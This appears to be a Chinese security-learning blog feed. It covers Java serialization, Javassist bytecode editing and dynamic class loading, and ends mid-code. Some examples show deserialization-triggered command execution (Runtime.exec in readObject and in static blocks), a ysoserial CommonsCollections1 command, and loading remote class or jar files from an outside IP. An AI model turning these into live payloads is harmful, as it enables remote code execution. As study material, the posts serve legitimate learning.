java.io.Serializable { void writeExternal(ObjectOutput out) throws IOException; void readExternal(ObjectInput in) throws IOException,ClassNotFoundException; } 它是Serializable接口的子类，这个接口里面定义了两个抽象的方法，用户需要重载writeExternal()和readExternal()方法，用来决定如何序列化和反序列化。\n因为序列化和反序列化方法需要自己实现，因此可以指定序列化哪些属性，而transient在这里无效。\n对Externalizable对象反序列化时，会先调用类的无参构造方法，这是有别于默认反序列方式的。如果把类的不带参数的构造方法删除，或者把该构造方法的访问权限设置为private、默认或protected级别，会抛出java.io.InvalidException: no valid constructor异常，因此Externalizable对象必须有默认构造函数，而且必需是public的。\nserialVersionUID字段 这个字段可以在序列化过程中控制序列化的版本。一般格式就是下面这个：\n一个对象数据，在反序列化过程中，如果序列化串中的serialVersionUID与当前对象值不同，则反序列化失败，会报错，否则成功。\n如果serialVersionUID没有显式生成，系统就会自动生成一个。属性的变化都会导致自动生成的serialVersionUID发生变化。如果序列化和反序列化的serialVersionUID不同，则会报序列化版本不同的错误。\n如果我们保持了serialVersionUID的一致，则在反序列化时，对于新增的字段会填入默认值null（int的默认值0）,对于减少的字段则直接忽略。\n其他类 如上图，现在我们来了解一下ObjectInputStream和ObjectOutputStream。\nObjectOutputStream 这个类与序列化相关\n部分源码如下：\n1 2 public class ObjectOutputStream extends OutputStream implements ObjectOutput, ObjectStreamConstants {} java.io.ObjectOutputStream继承自 OutputStream 类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。\n现在来看这个类的构造方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public ObjectOutputStream(OutputStream out) throws IOException { verifySubclass(); bout = new BlockDataOutputStream(out); handles = new HandleTable(10, (float) 3.00); subs = new ReplaceTable(10, (float) 3.00); enableOverride = false; writeStreamHeader(); bout.setBlockDataMode(true); if (extendedDebugInfo) { debugInfoStack = new DebugTraceInfoStack(); } else { debugInfoStack = null; } } 该构造方法接收一个 OutputStream 对象作为参数，并且在实例化时将变量enableOverride设置为false。\n例如：\n1 2 3 4 //这里会创建一个FileOutputStream流以写入数据到File对象所代表的文件 FileOutputStream fos = new FileOutputStream(\u0026#34;file.txt\u0026#34;); // ObjectOutputStream oos = new ObjectOutputStream(fos); 这里序列化想要利用就要用到ObjectOutputStream这个类的writeObject方法，writeObject()方法源码如下：\n前面在实例化时将enableOverride设置为false，所以这里真正起作用的是writeObject0()方法。\nObjectInputStream 这个类和反序列化相关，它可以读取 ObjectOutputStream 写入的字节流，并将其反序列化为相应的对象。\n部分构造函数源码如下：\n1 2 3 4 5 6 7 8 9 public ObjectInputStream(InputStream in) throws IOException { verifySubclass(); bin = new BlockDataInputStream(in); handles = new HandleTable(10); vlist = new ValidationList(); enableOverride = false; readStreamHeader(); bin.setBlockDataMode(true); } 核心方法是readObject()，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public final Object readObject() throws IOException, ClassNotFoundException { if (enableOverride) { return readObjectOverride(); } // if nested read, passHandle contains handle of enclosing object int outerHandle = passHandle; try { Object obj = readObject0(false); handles.markDependency(outerHandle, passHandle); ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } if (depth == 0) { vlist.doCallbacks(); } return obj; } finally { passHandle = outerHandle; if (closed \u0026amp;\u0026amp; depth == 0) { clear(); } } } 可以看到最后返回的是反序列化后的对象。\n序列化 测试代码如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.Serializable; class Test implements Serializable{ private String name = \u0026#34;fupanc\u0026#34; ; protected char height = \u0026#39;A\u0026#39; ; public transient String sex = \u0026#34;boy\u0026#34;; private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; class Main{ public static void main(String[] args) throws Exception { Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); } } 成功生成ser.ser文件，十六进制打开看一下，如下：\n可以看出这里只序列化了height和name，而sex和age并没有被序列化。所以在这里就可以知道正如前面说的，使用transient和static修饰的变量不会被序列化。\n反序列化 反序列化对象时有如下限制：\n被反序列化的类必须存在。 serialVersionUID值必须一致。 同样使用上面的Test.java。这里就只给Main.java，反序列化代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package org.example; import java.io.FileInputStream; import java.io.ObjectInputStream; class Main { public static void main(String[] args) throws Exception { ObjectInputStream p = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)p.readObject();//这里由于返回类型不同，需要强制转换 System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } } 输出结果如下：\n1 2 3 反序列化后的name:haha 反序列化后的sex:null 反序列化后的age:1111 解读一下结果：\nsex为null，就是因为我在Test类用transient修饰，所以在序列化时并不会将sex字段序列化，所以这里并没有值。 age为1111，这就与static有关了，这是因为static为全局变量，在JVM中所有实例都会共享该字段。 对比一下，刚好可以再说明一个点\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //这里添加static public String sex = \u0026#34;boy\u0026#34;; //这里去除transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java (省去序列化过程，注意这里是将序列化和反序列化分开进行的)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //反序列化 ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } 输出为：\n1 2 3 反序列化后的name:fupanc 反序列化后的sex:boy 反序列化后的age:1111 从这个结果可以更加说明static修饰的字段不会被序列化的特性，以及更加清楚了是否使用transient结果的不同。\n但是在前一个测试过程中，发现了一个问题，\nTest.java还是之前那个：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import java.io.Serializable; class Test implements Serializable{ private static String name = \u0026#34;fupanc\u0026#34; ; //这里添加static public String sex = \u0026#34;boy\u0026#34;; //这里去除transient private static int age = 1111 ; public void setName(String name){ this.name=name; } public String getName(){ return this.name; } public String getSex(){ return this.sex; } public int getAge(){ return this.age; } } Main.java内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.FileInputStream; class Main{ public static void main(String[] args){ try{ //序列化 Test p = new Test(); p.setName(\u0026#34;haha\u0026#34;); ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(p); x.close(); //反序列化 ObjectInputStream y = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); Test ctf = (Test)y.readObject(); System.out.println(\u0026#34;反序列化后的name:\u0026#34;+ctf.getName()); System.out.println(\u0026#34;反序列化后的sex:\u0026#34;+ctf.getSex()); System.out.println(\u0026#34;反序列化后的age:\u0026#34;+ctf.getAge()); } catch(Exception e){ e.printStackTrace(); } } } 运行结果：\n1 2 3 反序列化后的name:haha 反序列化后的sex:boy 反序列化后的age:1111 注意这里的name的结果为haha，但是之前分开序列化和反序列化时的name的值为fupanc。那么为什么会出现这样的结果呢？解答如下（个人理解）：\n有想过为什么在反序列化的时候要引入包吗，\n同时可以看给出来的ser.ser文件的十六进制表示，其中并没有序列化方法，并且只存在sex（这是因为其他两个变量都被我设置为了static，所以不会被序列化），那么是否想过为什么在序列化的时候没有序列化方法。\n个人理解如下，对于序列化，它只序列化对象的的状态，而方法属于类的定义部分，不属于对象的状态部分，所以方法并不是被序列化，所以，如果我们想要再次利用这个Test类，需要引入包，从而使得可以对应到方法来利用。\n两种不同结果的利用方法最大的不同在于一个地方，JVM加载进程。\n在分开序列化和反序列化时，是分别运行了两次，即进行了两次JVM加载，但是这个static静态加载是存在于“当前”进程的，并且看前面序列化后的文件内容，是不存在static关键字修饰的变量的，static修饰的变量是绑定在对象上的，而是直接存在于内存中的，所以在第二次加载时会直接将内存中存在的fupanc赋值给name。\n而序列化和反序列化一起，对比一下，基本就清楚了，同时进行，在序列化之前将static修饰的name改为haha，并加载进了内存中，然后在反序列化时直接在内存中找到了这个值赋值给了name。\n综上，造成这个差异的主要有两个点：\n序列化的特性 “JVN加载特性” 一个知识点 这里需要注意的一个点，我们可以通过在待序列化或反序列化的类中定义readObject和writeObject方法，来实现自定义的序列化和反序列化操作，当然前提是，被序列化的类必须有此方法，并且方法的修饰符必须是private。代码参考如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 package org.example; import java.io.Serializable; class Test implements Serializable{ public String cmd; private void readObject(java.io.ObjectInputStream stream) throws Exception{ stream.defaultReadObject();//调用ObjectInputStream默认反序列化方法 Runtime.getRuntime().exec(cmd); } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import java.io.*; class Main{ public static void main(String[] args) throws Exception{ Test haha = new Test(); haha.cmd = \u0026#34;calc\u0026#34;; ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(\u0026#34;haha.ser\u0026#34;)); obj.writeObject(haha); obj.close(); ObjectInputStream ceshi = new ObjectInputStream(new FileInputStream(\u0026#34;haha.ser\u0026#34;)); ceshi.readObject(); ceshi.close(); } } 成功弹出计算机\n这样就确实自定义了反序列化的方法，序列化同理。\nysoserial工具 ysoserial集合了各种java反序列化的利用链。\n利用链也叫\u0026quot;gadget chains\u0026quot;，我们通常称为gadget。\n直接下载编译好的jar文件就能用：\n1 https://github.com/frohoff/ysoserial 使用很简单，如下简单POC：\n1 java -jar ysoserial-master.jar CommonsCollections1 \u0026#34;id\u0026#34; 参考文章：\nhttps://javasec.org/javase/JavaDeserialization/Serialization.html\nhttps://blog.csdn.net/mocas_wang/article/details/107621010\n","date":"2025-01-22T13:20:36+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","title":"Java反序列化"},{"content":"Java Javassist 概述 Java programming ASSISTant，Java编程助手。是Java中编辑字节码的类库。它可以在Java程序运行时定义一个新的类，并加载到JVM中；还可以在JVM加载时修改一个类文件。\nJava中所有的类都被编译为class文件来运行，在编译完class文件之后，类不能再被显式修改，而Javassist就是用来处理编译后的class文件，它可以用来修改方法或者新增方法，并且不需要深入了解字节码，还可以生成一个新的类对象。\nJavassist核心API ClassPool 这个类是javassist的核心组件之一。ClassPool是CtClass对象容器，\n常用方法：\nClassPool getDefault()：返回默认的ClassPool，一般通过该方法创建我们的ClassPool； ClassPool insertClassPath(ClassPath cp)：将一个ClassPath对象插入到类搜索路径的起始位置，也就是向ClassPool容器插入一个.class对象。 ClassPool appendClassPath：将一个ClassPath对象加到类搜索路径的末尾位置； CtClass makeClass(java.lang.String classname)：根据类名创建新的CtClass对象。类名必须是全量类名。 CtClass get(java.lang.String classname)：从源中读取类文件，并返回对CtClass来表示对该类文件的对象的引用。 CtClass 在javassist中每个需要编译的class都对应一个CtClass实例，CtClass（compile time class），这些类会存储在ClassPool中。所以CtClass对象必须从该对象容器中获取。\n常用方法：\nvoid setSuperclass(CtClass clazz)：更改超类（父类），除非此对象表示接口。 byte[] toBytecode()：将该类转换为类文件，即将CtClass对象cc转换为字节码数组； CtConstructor makeClassInitializer()：制作一个空的类初始化程序（静态构造函数）。 Class x.toClass()：将Ctclass类型的字节码转换成Class类型。 CtMethod/CtField 其实这三个可以理解为加强版Class/method/field对象。同样可以使用CtClass中的CtField和CtMethod来获取类对象中的字段和方法。\nMaven 在一个项目中，想要使用就需要加依赖，\n在POM.XML中添加如下代码即可（注意依赖的版本）：\n1 2 3 4 5 6 7 //这样才能使用javassist \u0026lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.28.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 读取类/成员变量/方法信息的代码 使用ClassPool对象获取到CtClass对象后就可以像使用Java反射API一样去读取类信息了。最终在maven项目中的测试代码如下：\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } 获取的操作：\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import javassist.CtConstructor; public class Main{ public static void main(String[] args) throws Exception{ //获取ClassPool对象 ClassPool classPool = ClassPool.getDefault(); System.out.println(\u0026#34;1:\u0026#34;+classPool); //获取CtClass对象 CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;);//这里get()等同于getClass() System.out.println(\u0026#34;2:\u0026#34;+ctClass); //获取CtField属性 CtField[] ctField = ctClass.getDeclaredFields(); for(CtField x : ctField){ System.out.println(\u0026#34;3:\u0026#34;+x); } //获取CtMethod方法 CtMethod[] ctMethod = ctClass.getDeclaredMethods(); for(CtMethod x : ctMethod){ System.out.println(\u0026#34;4:\u0026#34;+x); } //获取CtConStructor构造方法 CtClass[] parameters = new CtClass[]{ classPool.get(\u0026#34;java.lang.String\u0026#34;), CtClass.charType, CtClass.intType }; CtConstructor ctConstructor = ctClass.getDeclaredConstructor(parameters); System.out.println(\u0026#34;5:\u0026#34;+ctConstructor); } } 输出为：\n1 2 3 4 5 6 7 8 9 1:[class path: java.lang.Object.class;] 2:javassist.CtClassType@5caf905d[public class org.example.Test fields=org.example.Test.name:Ljava/lang/String;, org.example.Test.yn:C, org.example.Test.age:I, constructors=javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V], methods=javassist.CtMethod@3ac68cb[public setAge (I)V], javassist.CtMethod@7424e08a[protected getAge ()I], javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;], ] 3:org.example.Test.name:Ljava/lang/String; 3:org.example.Test.yn:C 3:org.example.Test.age:I 4:javassist.CtMethod@3ac68cb[public setAge (I)V] 4:javassist.CtMethod@7424e08a[protected getAge ()I] 4:javassist.CtMethod@26562bc2[private getName ()Ljava/lang/String;] 5:javassist.CtConstructor@3d494fbf[public Test (Ljava/lang/String;CI)V] 注意看读取代码这里的细节。与反射对比，尤其是对于函数参数类型的改变。\n修改类方法 只需要调用CtMethod类的对应的API，CtMethod提供了类方法修改的API，如：\nsetModifiers：可修改类的访问修饰符，\ninsertBefore和insertAfter：能够实现在类方法执行的前后插入任意的Java代码片段，\nsetBody ：可以修改整个方法的代码等。\nTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; public class Test{ private String name; protected char yn; public int age; public void setAge(int age){ this.age = age; } protected int getAge(){ return this.age; } public Test(String name,char yn,int age){ this.age = age; this.yn = yn; this.name = name; } private String getName(){ return this.name; } } Main.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example; import javassist.ClassPool; import javassist.CtMethod; import javassist.CtClass; public class Main{ public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.getCtClass(\u0026#34;org.example.Test\u0026#34;); //修改整个代码块 CtMethod ctMethod = ctClass.getDeclaredMethod(\u0026#34;getAge\u0026#34;); ctMethod.setBody(\u0026#34;{return \\\u0026#34;haha\\\u0026#34; ;}\u0026#34;); //修改部分，看代码结构 CtMethod ctMethod1 = ctClass.getDeclaredMethod(\u0026#34;setAge\u0026#34;,new CtClass[]{CtClass.intType}); ctMethod1.insertBefore(\u0026#34;System.out.println(\\\u0026#34;before is\\\u0026#34;);\u0026#34;); CtMethod ctMethod2 = ctClass.getDeclaredMethod(\u0026#34;getName\u0026#34;); ctMethod2.insertAfter(\u0026#34;System.out.println(\\\u0026#34;after is\\\u0026#34;);\u0026#34;); //输出修改后的字节码到文件，方便看结果 ctClass.writeFile(\u0026#34;output\u0026#34;);//落地的是class文件 } } 现在来看看修改后时什么，结果如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 //Test.class package org.example; public class Test { private String name; protected char yn; public int age; public void setAge(int age) { System.out.println(\u0026#34;before is\u0026#34;); this.age = age; } protected int getAge() { return (int)\u0026#34;haha\u0026#34;; } public Test(String name, char yn, int age) { this.age = age; this.yn = yn; this.name = name; } private String getName() { String var2 = this.name; System.out.println(\u0026#34;after is\u0026#34;); return var2; } } 可以对比一下之前的Test.java看看结果。\n动态创建一个类 API提供相应的make方法实现的操作\n看下面的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; public class Main { public static void main(String[] args) { try { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); // 使用ClassPool创建一个新的类 CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // 创建类成员变量content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // 将成员变量添加到ctClass对象中 ctClass.addField(ctField); // 创建一个主方法并输出content对象值 CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // 将成员方法添加到ctClass对象中 ctClass.addMethod(ctMethod); //根据包结构创建目录并生成文件 ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 很清楚，理解学习一下代码就行了，建议在学习后自己敲一遍。\n随后就生成了haha.class\n![image-20240622210215625](Java Javassist/image-20240622210215625.png)\n内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package org.example; public class haha { private static String content = \u0026#34;Hello world~\u0026#34;; public static void main(String[] var0) { System.out.println(content); } public haha() { } } 一般具体使用的时候会利用到static语句块，简单构造一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import javassist.*; public class Main { public static void main(String[] args) throws Exception { ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;haha\u0026#34;); CtField ctField = CtField.make(\u0026#34;private String content = \\\u0026#34;111\\\u0026#34;;\u0026#34;, ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public String getContent(){ return this.content;}\u0026#34;, ctClass); ctClass.addMethod(ctMethod); CtConstructor ctConstructor = ctClass.makeClassInitializer(); ctConstructor.insertBefore(\u0026#34;System.out.println(\\\u0026#34;123\\\u0026#34;);\u0026#34;); ctClass.writeFile(\u0026#34;output\u0026#34;); Class clazz = ctClass.toClass(); clazz.getDeclaredConstructor().newInstance(); } } 成功在公职太输出 123。\n生成的haha.class文件内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // public class haha { private String content = \u0026#34;111\u0026#34;; public String getContent() { return this.content; } static { System.out.println(\u0026#34;123\u0026#34;); } public haha() { } } 其实还有其他的API可以用来构造一个类以及类中的各种属性，但这里就不多说了。\n也可以利用二进制来动态创建，如下：\n但是这个需要在项目中添加依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-io\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-io\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.8.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 然后再运行下面这个代码即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import javassist.ClassPool; import javassist.CtClass; import javassist.CtField; import javassist.CtMethod; import org.apache.commons.io.FileUtils; import java.io.File; import java.util.Arrays; public class Main { public static void main(String[] args) { try { // 创建ClassPool对象 ClassPool classPool = ClassPool.getDefault(); // 使用ClassPool创建一个新的类 CtClass ctClass = classPool.makeClass(\u0026#34;org.example.haha\u0026#34;); // 创建类成员变量content CtField ctField = CtField.make(\u0026#34;private static String content = \\\u0026#34;Hello world~\\\u0026#34;;\u0026#34;, ctClass); // 将成员变量添加到ctClass对象中 ctClass.addField(ctField); // 创建一个主方法并输出content对象值 CtMethod ctMethod = CtMethod.make( \u0026#34;public static void main(String[] args) { System.out.println(content); }\u0026#34;, ctClass ); // 将成员方法添加到ctClass对象中 ctClass.addMethod(ctMethod); // 使用类CtClass，生成类二进制 byte[] bytes = ctClass.toBytecode(); // 输出二进制数据到控制台 System.out.println(Arrays.toString(bytes)); // 将class二进制内容写入到类文件 File classFilePath = new File(new File(System.getProperty(\u0026#34;user.dir\u0026#34;), \u0026#34;maven_text/output/org/example\u0026#34;), \u0026#34;haha.class\u0026#34;); FileUtils.writeByteArrayToFile(classFilePath, bytes); // 将生成的类写入文件系统 ctClass.writeFile(\u0026#34;output\u0026#34;); } catch (Exception e) { e.printStackTrace(); } } } 看一看代码理解一下。\n然后生成如下目录结构：\n![image-20240622211651698](Java Javassist/image-20240622211651698.png)\nhaha.class的内容同上。\n有个点稍微说明一下，使用如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.*; public class Main { public static void main(String[] args) throws Exception{ ClassPool classPool = ClassPool.getDefault(); CtClass ctClass = classPool.makeClass(\u0026#34;org.example.erqi\u0026#34;); CtField ctField = CtField.make(\u0026#34;public String name = \\\u0026#34;ahhaha\\\u0026#34;; \u0026#34;,ctClass); ctClass.addField(ctField); CtMethod ctMethod = CtMethod.make(\u0026#34;public void setName(String name){ this.name = name ;}\u0026#34;,ctClass); ctClass.addMethod(ctMethod); Class clazz = ctClass.toClass(); System.out.println(ctClass); System.out.println(clazz); } } 输出为：\n1 2 3 javassist.CtNewClass@67f89fa3[hasConstructor changed frozen public class org.example.erqi fields=org.example.erqi.name:Ljava/lang/String;, constructors=javassist.CtConstructor@4ac68d3e[public erqi ()V], methods=javassist.CtMethod@ab2416c4[public setName (Ljava/lang/String;)V], ] class org.example.erqi 细心的师傅可能都已经发现了，对于前面所有的用过的代码，我们的操作层面都是字节码，所以生成的文件都是class文件，可以理解一下这个输出结果。\n最后，既然我们都已经生成了.class文件，那么我们现在就可以利用很多方法了，比如动态加载字节码。注意思考。\n参考文章：\nhttps://cloud.tencent.com/developer/article/1815164\nhttps://blog.csdn.net/google20/article/details/144730353\nhttps://nivi4.notion.site/Java-Javassist-621beee2064a4494abe794843028449d\n","date":"2025-01-22T13:03:02+08:00","permalink":"https://fupanc-w1n.github.io/p/javassist/","title":"Javassist"},{"content":"动态加载字节码 字节码 Java字节码指的是JVM执行使用的一类指令，通常被存储在.class文件中。\n加载远程/本地文件 在前面类加载机制的学习中，正常情况下URLClassLoader是AppClassLoader的父类。\n通常情况下,Java会根据配置项sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URL类）来寻找.class文件来加载，这个基础路径有分三种情况：\nURL未以斜杠/结尾，则认为是一个Jar文件，使用JarLoader来寻找类，即在Jar包上寻找类。 URL以/结尾，且协议名为file，则使用FileLoader来寻找类，即在本地系统中寻找.class文件 URL以斜杠/结尾，且协议名不为file，则使用最基础的Loader来寻找类 本地加载 .class 文件\n其实都是前面说过的了，主要是加载class文件，所以class文件不能有包名。\nReflection.java内容：\n1 2 3 4 5 6 7 public class Reflection { private String name = \u0026#34;fupanc\u0026#34;; public Reflection(){ System.out.println(\u0026#34;调用了Reflection的构造函数\u0026#34;); } } Main.java内容;\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } 可以先使用javac将Reflection.java打成Reflection.class然后放在D盘。\n我的maven项目是自动编译然后放在项目中的target目录下的，这里直接找就行。\n启动成功输出：\n1 调用了Reflection的构造函数 但是我发现可以如下加载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 //这个Reflection类是由包名的 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;file://D:\\\\\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); clazz.newInstance(); } } 以此类推吧，对于class文件也不一定是必须没有包名，加载时加上软件包即可，后面就不补充了。\n远程加载 .class 文件\n其实都是差不多的，这里试一下远程加载自己vps上的class文件，但感觉应该不行，应该是有什么安全策略的。自己编写一下\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/Reflection.class\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;Reflection\u0026#34;); clazz.newInstance(); } } 然后将本地的Reflection.java文件删除，再来运行，发现报错如下:\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Reflection at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:9) 可能是URL路径问题，这是我看了一下前面讲的基础路径，尝试一下用jar包呢，所以我将构建jar包的代码改成如下：\n1 2 3 4 5 public class MyTest{ public MyTest(){ System.out.println(\u0026#34;调用了远程url类的构造函数\u0026#34;); } } 然后传到服务器上即可，如下尝试：\n1 2 3 4 5 6 7 8 9 10 11 12 package java_foundation; import java.net.URLClassLoader; import java.net.URL; public class Main { public static void main(String[] args) throws Exception{ URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\u0026#34;http://47.100.223.173/jar_build.jar\u0026#34;)}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); clazz.newInstance(); } } 成功调用并输出：\n1 调用了远程url类的构造函数 这样用符合基础路径的格式成功调用了远程的class代码。感觉利用点很大呢。\n利用defineClass()直接加载字节码 在之前的调试中，可以知道Java加载都需要经过：\n1 ClassLoader.loadClass -\u0026gt; ClassLoader.findClass -\u0026gt; ClassLoader.defineClass 其中：\nloadClass的作用是从已经加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下执行findClass findClass的作用就是根据基础URL制定的方式来查找类，读取字节码后交给defineClass defineClass的作用是处理前面传入的字节码，将其处理成真正的Java类 defineClass决定如何将一段字节流转换变成一个Java类，Java默认的ClassLoader.defineClass是一个native方法（C语言实现）：\n利用方法如下：\n利用反射获取defineClass方法\n1 2 3 4 5 6 7 8 import java.lang.reflect.Method; public class Main{ public static void main(String[] args){ Method method = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;,String.class,byte[].class, int.class, int.class); method.setAccessible(true); } } 此时Text.java内容为：\n1 2 3 4 5 6 7 8 9 10 11 12 import java.lang.Runtime; public class Text{ static{ try{ Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); }catch(Exception e){ System.out.println(\u0026#34;异常退出\u0026#34;); } } } //还是需要注意class文件要没有包名 将其转换为class文件后再转换为base64编码，如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package java_foundation; import java.nio.file.*; import java.util.Base64; public class FileToBase64 { public static void main(String[] args) { String filePath = \u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\Text.class\u0026#34;; // 请替换成你实际的文件路径 try { byte[] fileBytes = readFileToByteArray(filePath); String base64Encoded = encodeBase64(fileBytes); System.out.println(\u0026#34;Base64 Encoded Content:\u0026#34;); System.out.println(base64Encoded); } catch (Exception e) { 